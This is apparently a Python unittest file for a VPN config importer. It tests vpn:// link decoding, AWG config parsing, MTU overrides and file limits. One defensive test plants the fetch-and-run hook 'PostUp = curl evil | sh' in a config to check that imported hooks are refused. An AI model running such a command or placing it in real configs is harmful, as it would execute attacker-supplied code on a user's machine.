import base64
import json
import os
import struct
import unittest
import zlib

from tests.fakes import tmpdir
from vpn_deck.errors import ConfigImportError
from vpn_deck.importer import (
    decode_vpn_uri,
    inspect_awg_conf,
    plan_import,
    read_import_file,
    set_conf_mtu,
)
from vpn_deck.models import ConfigKind

CONF = """[Interface]
PrivateKey = cHJpdmF0ZQ==
Address = 10.8.1.2/32
DNS = $PRIMARY_DNS, $SECONDARY_DNS
Jc = 4

[Peer]
PublicKey = cHVibGlj
Endpoint = vpn.example.com:51820
AllowedIPs = 0.0.0.0/0
"""


def vpn_link(payload: dict, compress: bool = True) -> str:
    raw = json.dumps(payload).encode()
    if compress:  # Qt qCompress: 4-byte big-endian length + zlib stream
        raw = struct.pack(">I", len(raw)) + zlib.compress(raw)
    return "vpn://" + base64.urlsafe_b64encode(raw).decode().rstrip("=")


def amnezia_payload(config: str = CONF, **extra) -> dict:
    return {
        "containers": [{"container": "amnezia-awg", "awg": {"last_config": json.dumps({"config": config})}}],
        "defaultContainer": "amnezia-awg",
        **extra,
    }


class VpnUriTest(unittest.TestCase):
    def test_compressed_link(self):
        conf = decode_vpn_uri(vpn_link(amnezia_payload(dns1="9.9.9.9", dns2="8.8.8.8")))
        self.assertIn("DNS = 9.9.9.9, 8.8.8.8", conf)
        self.assertIn("Jc = 4", conf)

    def test_plain_json_link(self):
        self.assertIn("[Peer]", decode_vpn_uri(vpn_link(amnezia_payload(), compress=False)))

    def test_dns_fallback_when_not_ipv4(self):
        conf = decode_vpn_uri(vpn_link(amnezia_payload(dns1="dns.example", dns2="")))
        self.assertIn("DNS = 1.1.1.1, 1.0.0.1", conf)

    def test_default_container_wins(self):
        payload = {
            "containers": [
                {"container": "amnezia-wireguard", "wireguard": {"last_config": json.dumps({"config": "WG"})}},
                {"container": "amnezia-awg", "awg": {"last_config": json.dumps({"config": "AWG"})}},
            ],
            "defaultContainer": "amnezia-awg",
        }
        self.assertEqual(decode_vpn_uri(vpn_link(payload)), "AWG")

    def test_last_config_as_object(self):
        payload = {"containers": [{"container": "x", "awg": {"last_config": {"config": "AWG"}}}]}
        self.assertEqual(decode_vpn_uri(vpn_link(payload)), "AWG")

    def test_errors_are_readable(self):
        cases = {
            "vpn://!!!": "base64",
            vpn_link({"containers": []}): "нет конфига",
            vpn_link({"containers": [{"container": "openvpn", "openvpn": {}}]}): "нет конфига",
            "vpn://" + base64.urlsafe_b64encode(b"\0\0\0\x05\x78garbage").decode(): "распаковать",
            "vpn://" + base64.urlsafe_b64encode(b"not json").decode(): "не JSON",
        }
        for link, fragment in cases.items():
            with self.subTest(link=link[:30]):
                with self.assertRaises(ConfigImportError) as cm:
                    decode_vpn_uri(link)
                self.assertIn(fragment, str(cm.exception))

    def test_decompression_bomb_is_refused(self):
        bomb = b"{" + b" " * (3 * 1024 * 1024) + b"}"
        link = "vpn://" + base64.urlsafe_b64encode(struct.pack(">I", len(bomb)) + zlib.compress(bomb)).decode()
        with self.assertRaises(ConfigImportError):
            decode_vpn_uri(link)


class AwgConfTest(unittest.TestCase):
    def test_inspect(self):
        info = inspect_awg_conf(CONF)
        self.assertIsNone(info.mtu)
        self.assertEqual(info.hooks, ())

    def test_inspect_mtu_and_hooks(self):
        conf = CONF.replace("Jc = 4", "MTU = 1420\nPostUp = touch /tmp/x\npredown = true")
        info = inspect_awg_conf(conf)
        self.assertEqual(info.mtu, 1420)
        self.assertEqual(info.hooks, ("PostUp", "PreDown"))

    def test_not_a_conf(self):
        for text in ("hello", "[Interface]\nPrivateKey = x\n", "[Peer]\nPublicKey = x\n"):
            with self.subTest(text=text):
                with self.assertRaises(ConfigImportError):
                    inspect_awg_conf(text)

    def test_set_mtu_adds_and_replaces(self):
        added = set_conf_mtu(CONF, 1280)
        self.assertEqual(inspect_awg_conf(added).mtu, 1280)
        self.assertLess(added.index("MTU = 1280"), added.index("[Peer]"))
        replaced = set_conf_mtu(added, 1300)
        self.assertEqual(replaced.count("MTU ="), 1)
        self.assertEqual(inspect_awg_conf(replaced).mtu, 1300)


class PlanImportTest(unittest.TestCase):
    def test_conf(self):
        plan = plan_import(CONF)
        self.assertIs(plan.kind, ConfigKind.AWG)
        self.assertTrue(plan.mtu_warning)  # absent MTU -> awg-quick picks ~1420

    def test_mtu_override_clears_warning(self):
        plan = plan_import(CONF, mtu_override=1280)
        self.assertEqual(plan.mtu, 1280)
        self.assertFalse(plan.mtu_warning)
        self.assertIn("MTU = 1280", plan.content)

    def test_mtu_override_range(self):
        with self.assertRaises(ConfigImportError):
            plan_import(CONF, mtu_override=9000)

    def test_vpn_link_in_file(self):
        plan = plan_import("\n" + vpn_link(amnezia_payload()) + "\n")
        self.assertIs(plan.kind, ConfigKind.AWG)
        self.assertIn("[Interface]", plan.content)

    def test_hooks_from_link_are_refused(self):
        evil = CONF.replace("Jc = 4", "PostUp = curl evil | sh")
        with self.assertRaises(ConfigImportError) as cm:
            plan_import(vpn_link(amnezia_payload(evil)))
        self.assertIn("PostUp", str(cm.exception))

    def test_hooks_in_own_conf_warn(self):
        plan = plan_import(CONF.replace("Jc = 4", "PostUp = echo hi"))
        self.assertEqual(len(plan.warnings), 1)
        self.assertIn("PostUp", plan.warnings[0])

    def test_vless(self):
        link = "vless://11111111-2222-3333-4444-555555555555@host:443?security=reality&pbk=k&type=tcp#n"
        plan = plan_import(link)
        self.assertIs(plan.kind, ConfigKind.VLESS)
        self.assertEqual(plan.label, "VLESS REALITY")
        self.assertEqual(plan.content.strip(), link)

    def test_singbox_json(self):
        cfg = {"inbounds": [{"type": "tun"}], "outbounds": [{"type": "direct"}]}
        plan = plan_import(json.dumps(cfg))
        self.assertIs(plan.kind, ConfigKind.SINGBOX)
        self.assertEqual(json.loads(plan.content), cfg)

    def test_conf_pasted_as_one_line(self):
        flat = " ".join(CONF.split())
        plan = plan_import(flat)
        self.assertIs(plan.kind, ConfigKind.AWG)
        self.assertIn("Endpoint = vpn.example.com:51820\n", plan.content)
        self.assertIn("DNS = $PRIMARY_DNS, $SECONDARY_DNS\n", plan.content)
        self.assertIn("PrivateKey = cHJpdmF0ZQ==\n", plan.content)

    def test_several_links_refused(self):
        with self.assertRaises(ConfigImportError):
            plan_import("vless://a@b:1\nvless://c@d:2\n")


class ReadFileTest(unittest.TestCase):
    def write(self, data: bytes) -> str:
        path = os.path.join(tmpdir("read"), "f")
        with open(path, "wb") as f:
            f.write(data)
        return path

    def test_bom_is_stripped(self):
        self.assertTrue(read_import_file(self.write(b"\xef\xbb\xbf[Interface]")).startswith("[Interface]"))

    def test_limits(self):
        for data, fragment in ((b"", "пустой"), (b"\xff\xfe\x00", "UTF-8"), (b"x" * (1024 * 1024 + 1), "1 МБ")):
            with self.subTest(fragment=fragment):
                with self.assertRaises(ConfigImportError) as cm:
                    read_import_file(self.write(data))
                self.assertIn(fragment, str(cm.exception))


if __name__ == "__main__":
    unittest.main()
